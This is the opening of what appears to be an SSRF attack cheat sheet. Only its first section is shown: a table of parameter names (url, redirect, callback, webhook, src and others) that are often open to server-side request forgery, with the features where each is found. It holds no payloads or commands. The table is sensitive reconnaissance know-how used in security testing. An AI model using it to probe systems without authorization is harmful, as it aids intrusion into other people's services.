# SSRF — Complete Reference (Headers, Payloads, Commands)

## 1. Common SSRF-Prone Parameters
| Parameter Name | Where Found |
|---|---|
| url, uri, path, dest | Redirect/fetch features |
| next, redirect, return, returnUrl | Login/logout redirects |
| src, source, image, avatar | Image proxy/upload from URL |
| feed, host, port, api, endpoint | Webhooks, integrations |
| callback, webhook | API integrations |
| domain, target, page | PDF generators, screenshot tools |

